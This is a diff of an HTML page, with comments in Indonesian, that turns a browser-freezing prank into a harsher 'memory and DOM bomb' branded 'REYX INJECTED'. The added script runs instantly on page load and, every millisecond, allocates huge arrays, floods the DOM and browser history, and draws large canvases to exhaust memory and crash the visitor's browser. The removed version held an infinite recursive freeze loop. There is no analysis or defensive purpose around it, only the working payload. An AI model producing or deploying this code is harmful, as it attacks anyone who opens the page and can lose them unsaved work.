@@ -1,38 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>CRITICAL FAILURE :: REYX INJECTED</title>
+    <title>FATAL ERROR :: REYX</title>
     <style>
-        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; text-align: center; padding-top: 20%; }
-        .glitch { font-size: 5vw; font-weight: bold; animation: pulse 0.1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; }
+        .crash-text { font-size: 50px; text-align: center; margin-top: 20%; text-shadow: 0 0 10px #f00; }
     </style>
 </head>
 <body>
-
-    <div class="glitch">SYSTEM FREEZE :: REYX INJECTED</div>
-    <div style="color: white; margin-top: 20px;">MEMORY OVERFLOW INITIATED...</div>
+    <div class="crash-text">SYSTEM OVERLOAD<br>REYX INJECTED</div>
 
     <script>
-        // MODUL FREEZE - OSKAC REX ENTERPRISE
-        function executeFreeze() {
-            console.log("REYX INJECTING...");
+        // MODUL: MEMORY & DOM BOMB
+        function startAnnihilation() {
+            let storage = [];
             
-            // Triggering High-Intensity Recursive Loop
-            // Menghabiskan Call Stack dan CPU Cycle dalam milidetik
-            while(true) {
-                const data = new Array(1000000).fill("REYX_VIRUS_SPIDER");
-                window.history.pushState(null, "", window.location.href);
-                // Recursive call tanpa batas
-                executeFreeze();
-            }
+            // Loop ini tidak hanya rekursif, tapi menggandakan penggunaan RAM secara eksponensial
+            setInterval(() => {
+                // 1. Memory Exhaustion
+                for (let i = 0; i < 10000; i++) {
+                    storage.push(new Array(100000).fill("REYX_SPIDER_INFECTED"));
+                }
+
+                // 2. DOM Stress (Membuat ribuan elemen tak terlihat per detik)
+                let crashDiv = document.createElement('div');
+                crashDiv.innerHTML = Math.random();
+                document.body.appendChild(crashDiv);
+
+                // 3. Browser History Flooding
+                for (let j = 0; j < 500; j++) {
+                    window.history.pushState({}, "", "#REYX_" + Math.random());
+                }
+
+                // 4. Heavy Graphic Computation
+                let canvas = document.createElement('canvas');
+                let ctx = canvas.getContext('2d');
+                ctx.fillStyle = 'red';
+                ctx.fillRect(0, 0, 5000, 5000);
+            }, 1);
         }
 
-        // Delay eksekusi 3 detik agar user sempat melihat visual sebelum freeze total
-        setTimeout(() => {
-            executeFreeze();
-        }, 3000);
+        // Eksekusi Instan
+        startAnnihilation();
     </script>
 </body>
 </html>
